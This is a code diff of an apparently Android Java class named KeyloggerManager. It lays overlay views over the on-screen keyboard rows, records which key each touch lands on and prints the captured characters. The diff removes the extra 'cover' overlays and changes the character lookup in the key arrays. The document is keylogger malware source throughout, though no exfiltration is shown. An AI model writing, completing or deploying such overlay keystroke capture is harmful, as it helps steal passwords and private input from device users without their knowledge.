@@ -36,10 +36,6 @@ public class KeyloggerManager {
     volatile View[] row_2 = new View[9];
     volatile View[] row_3 = new View[9];
     volatile View[] row_4 = new View[5];
-    volatile View[] row_1_cover = new View[10];
-    volatile View[] row_2_cover = new View[9];
-    volatile View[] row_3_cover = new View[9];
-    volatile View[] row_4_cover = new View[5];
     volatile int total = 0;
 
     /** Initialize the necessary variables **/
@@ -82,9 +78,9 @@ public class KeyloggerManager {
 
                     /** Print the key to system.out then reset total **/
                     if (MAX_INDEX-total >= 0) {
-                        String key = qwerty_alpha[MAX_INDEX - total];
+                        String key = qwerty_alpha[total];
                         if (alt) {                                                                      /** If alt key was pressed then the alt_alpha will be used**/
-                            key = alt_alpha[MAX_INDEX - total];
+                            key = alt_alpha[total];
                             System.out.println("Total: " + total + " Input: " + key);
                             if (shifted) {
                                 shifted = !shifted;
@@ -138,13 +134,11 @@ public class KeyloggerManager {
                 }
             });
 
-            row_1_cover[i] = View.inflate(parent, R.layout.key_overlay, null);
             layoutParams_keys.gravity = Gravity.BOTTOM | Gravity.LEFT;
             layoutParams_keys.x = (width/10)*i;
             layoutParams_keys.y = 525;
 
             manager.addView(row_1[i], layoutParams_keys);
-            manager.addView(row_1_cover[i], layoutParams_keys);
         }
         for (i=0; i<row_2.length; i++) {
 
@@ -165,13 +159,11 @@ public class KeyloggerManager {
                 }
             });
 
-            row_2_cover[i] = View.inflate(parent, R.layout.key_overlay, null);
             layoutParams_keys.gravity = Gravity.BOTTOM | Gravity.LEFT;
             layoutParams_keys.x = (width/9)*i;
             layoutParams_keys.y = 350;
 
             manager.addView(row_2[i], layoutParams_keys);
-            manager.addView(row_2_cover[i], layoutParams_keys);
         }
         for (i=0; i<row_3.length; i++) {
 
@@ -192,13 +184,11 @@ public class KeyloggerManager {
                 }
             });
 
-            row_3_cover[i] = View.inflate(parent, R.layout.key_overlay, null);
             layoutParams_keys.gravity = Gravity.BOTTOM | Gravity.LEFT;
             layoutParams_keys.x = (width/9)*i;
             layoutParams_keys.y = 175;
 
             manager.addView(row_3[i], layoutParams_keys);
-            manager.addView(row_3_cover[i], layoutParams_keys);
         }
 
         for (i=0; i<row_4.length; i++) {
@@ -221,13 +211,11 @@ public class KeyloggerManager {
                 }
             });
 
-            row_4_cover[i] = View.inflate(parent, R.layout.key_overlay, null);
             layoutParams_keys.gravity = Gravity.BOTTOM | Gravity.LEFT;
             layoutParams_keys.x = (i > 2) ? (width/9) * (i+4) : (width/9)*i;
             layoutParams_keys.y = 0;
 
             manager.addView(row_4[i], layoutParams_keys);
-            manager.addView(row_4_cover[i], layoutParams_keys);
         }
     }
 }
